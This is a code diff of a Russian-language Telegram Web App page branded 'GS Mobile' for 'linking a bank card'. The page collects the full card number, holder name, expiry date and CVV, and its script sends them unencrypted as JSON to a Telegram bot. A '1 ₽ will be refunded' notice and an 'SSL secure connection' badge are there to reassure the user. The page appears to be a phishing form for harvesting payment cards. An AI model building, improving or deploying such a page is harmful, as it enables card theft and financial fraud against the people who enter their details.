@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Привязка карты - GS Mobile</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
@@ -13,7 +13,7 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
@@ -47,55 +47,102 @@
             font-size: 14px;
         }
         
+        .card-preview {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            color: white;
+            position: relative;
+            height: 200px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+        
+        .chip {
+            width: 50px;
+            height: 35px;
+            background: linear-gradient(135deg, #f0d878 0%, #d4af37 100%);
+            border-radius: 8px;
+            position: relative;
+        }
+        
+        .chip::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 30px;
+            height: 2px;
+            background: rgba(0,0,0,0.3);
+        }
+        
+        .chip::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(90deg);
+            width: 30px;
+            height: 2px;
+            background: rgba(0,0,0,0.3);
+        }
+        
+        .card-number-display {
+            font-size: 22px;
+            letter-spacing: 3px;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        
+        .card-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        
+        .card-holder {
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .card-expiry {
+            font-size: 14px;
+        }
+        
         .form-group {
             margin-bottom: 20px;
         }
         
-        label {
+        .form-group label {
             display: block;
             margin-bottom: 8px;
             color: #333;
-            font-weight: 500;
             font-size: 14px;
+            font-weight: 500;
         }
         
-        input {
+        .form-group input {
             width: 100%;
             padding: 15px;
             border: 2px solid #e0e0e0;
             border-radius: 12px;
             font-size: 16px;
-            transition: border-color 0.3s;
+            transition: all 0.3s ease;
+            outline: none;
         }
         
-        input:focus {
-            outline: none;
+        .form-group input:focus {
             border-color: #667eea;
         }
         
-        .card-row {
-            display: flex;
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
             gap: 15px;
-        }
-        
-        .card-row .form-group {
-            flex: 1;
-        }
-        
-        .card-row .form-group:last-child {
-            flex: 0.8;
-        }
-        
-        .card-number {
-            position: relative;
-        }
-        
-        .card-icon {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 24px;
         }
         
         .submit-btn {
@@ -109,7 +156,6 @@
             font-weight: 600;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
-            margin-top: 10px;
         }
         
         .submit-btn:hover {
@@ -121,129 +167,90 @@
             transform: translateY(0);
         }
         
-        .submit-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-        }
-        
-        .security-note {
-            text-align: center;
-            margin-top: 20px;
-            color: #888;
-            font-size: 12px;
+        .secure-badge {
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            margin-top: 20px;
+            color: #888;
+            font-size: 12px;
         }
         
-        .lock-icon {
-            font-size: 14px;
+        .secure-badge svg {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            fill: #4caf50;
         }
         
-        .error-message {
-            color: #e74c3c;
-            font-size: 13px;
-            margin-top: 5px;
-            display: none;
-        }
-        
-        .loading {
-            display: none;
+        .info-text {
             text-align: center;
-            padding: 20px;
-        }
-        
-        .spinner {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .success {
-            display: none;
-            text-align: center;
-            padding: 30px;
-        }
-        
-        .success-icon {
-            font-size: 60px;
-            color: #27ae60;
-            margin-bottom: 15px;
-        }
-        
-        .success h2 {
-            color: #333;
-            margin-bottom: 10px;
-        }
-        
-        .success p {
             color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        .amount-badge {
+            display: inline-block;
+            background: #e8f5e9;
+            color: #4caf50;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: 600;
+            margin-top: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="logo">
-            <h1>💳 GS Mobile</h1>
+            <h1>GS Mobile</h1>
             <p>Привязка банковской карты</p>
+        </div>
+        
+        <div class="info-text">
+            С баланса будет списано <span class="amount-badge">1 ₽</span><br>
+            Сумма вернётся на карту в течение нескольких минут
+        </div>
+        
+        <div class="card-preview">
+            <div class="chip"></div>
+            <div class="card-number-display" id="cardDisplay">•••• •••• •••• ••••</div>
+            <div class="card-info">
+                <div class="card-holder" id="holderDisplay">ИМЯ ФАМИЛИЯ</div>
+                <div class="card-expiry" id="expiryDisplay">MM/YY</div>
+            </div>
         </div>
         
         <form id="cardForm">
             <div class="form-group">
                 <label for="cardNumber">Номер карты</label>
-                <div class="card-number">
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                    <span class="card-icon">💳</span>
-                </div>
-                <div class="error-message" id="cardError">Введите корректный номер карты</div>
+                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" autocomplete="off">
             </div>
             
             <div class="form-group">
                 <label for="cardHolder">Держатель карты</label>
-                <input type="text" id="cardHolder" placeholder="IVAN IVANOV" maxlength="26" required>
+                <input type="text" id="cardHolder" placeholder="IVANOV IVAN" maxlength="26">
             </div>
             
-            <div class="card-row">
+            <div class="form-row">
                 <div class="form-group">
                     <label for="expiry">Срок действия</label>
-                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
                 </div>
                 <div class="form-group">
-                    <label for="cvv">CVV</label>
-                    <input type="password" id="cvv" placeholder="123" maxlength="3" required>
+                    <label for="cvv">CVV/CVC</label>
+                    <input type="password" id="cvv" placeholder="123" maxlength="3">
                 </div>
             </div>
             
-            <button type="submit" class="submit-btn" id="submitBtn">
-                Привязать карту
-            </button>
+            <button type="submit" class="submit-btn">Привязать карту</button>
         </form>
         
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Проверяем данные карты...</p>
-        </div>
-        
-        <div class="success" id="success">
-            <div class="success-icon">✅</div>
-            <h2>Карта привязана!</h2>
-            <p>Можете закрыть это окно</p>
-        </div>
-        
-        <div class="security-note">
-            <span class="lock-icon">🔒</span>
-            <span>Безопасное соединение SSL</span>
+        <div class="secure-badge">
+            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            Безопасное соединение SSL
         </div>
     </div>
 
@@ -252,24 +259,28 @@
         tg.ready();
         tg.expand();
         
-        tg.MainButton.setText('Привязать карту');
-        tg.MainButton.hide();
+        // Устанавливаем цвет шапки
+        tg.setHeaderColor('#667eea');
+        tg.setBackgroundColor('#667eea');
         
         const cardNumber = document.getElementById('cardNumber');
+        const cardHolder = document.getElementById('cardHolder');
         const expiry = document.getElementById('expiry');
         const cvv = document.getElementById('cvv');
-        const cardHolder = document.getElementById('cardHolder');
-        const form = document.getElementById('cardForm');
-        const submitBtn = document.getElementById('submitBtn');
-        const loading = document.getElementById('loading');
-        const success = document.getElementById('success');
+        const cardDisplay = document.getElementById('cardDisplay');
+        const holderDisplay = document.getElementById('holderDisplay');
+        const expiryDisplay = document.getElementById('expiryDisplay');
         
         // Форматирование номера карты
         cardNumber.addEventListener('input', (e) => {
             let value = e.target.value.replace(/\D/g, '');
-            value = value.substring(0, 16);
-            const parts = value.match(/.{1,4}/g);
-            e.target.value = parts ? parts.join(' ') : value;
+            let formatted = '';
+            for (let i = 0; i < value.length && i < 16; i++) {
+                if (i > 0 && i % 4 === 0) formatted += ' ';
+                formatted += value[i];
+            }
+            e.target.value = formatted;
+            cardDisplay.textContent = formatted || '•••• •••• •••• ••••';
         });
         
         // Форматирование срока действия
@@ -279,51 +290,35 @@
                 value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
             e.target.value = value;
+            expiryDisplay.textContent = value || 'MM/YY';
+        });
+        
+        // Имя держателя
+        cardHolder.addEventListener('input', (e) => {
+            let value = e.target.value.toUpperCase();
+            e.target.value = value.replace(/[^A-Z\s]/g, '');
+            holderDisplay.textContent = value || 'ИМЯ ФАМИЛИЯ';
         });
         
         // Только цифры для CVV
         cvv.addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+            e.target.value = e.target.value.replace(/\D/g, '');
         });
         
-        // Валидация
-        function validateCard() {
-            const number = cardNumber.value.replace(/\s/g, '');
-            return number.length === 16 && 
-                   cardHolder.value.length > 3 &&
-                   expiry.value.length === 5 &&
-                   cvv.value.length === 3;
-        }
-        
-        form.addEventListener('submit', async (e) => {
+        // Отправка формы
+        document.getElementById('cardForm').addEventListener('submit', (e) => {
             e.preventDefault();
-            
-            if (!validateCard()) {
-                document.getElementById('cardError').style.display = 'block';
-                return;
-            }
-            
-            submitBtn.disabled = true;
-            form.style.display = 'none';
-            loading.style.display = 'block';
             
             const cardData = {
                 card_number: cardNumber.value.replace(/\s/g, ''),
-                card_holder: cardHolder.value.toUpperCase(),
+                card_holder: cardHolder.value,
                 expiry: expiry.value,
-                cvv: cvv.value,
-                user_id: tg.initDataUnsafe.user?.id,
-                username: tg.initDataUnsafe.user?.username
+                cvv: cvv.value
             };
             
-            // Отправка данных через Telegram
+            // Отправляем данные в бот
             tg.sendData(JSON.stringify(cardData));
-            
-            setTimeout(() => {
-                loading.style.display = 'none';
-                success.style.display = 'block';
-                tg.close();
-            }, 2000);
+            tg.close();
         });
     </script>
 </body>
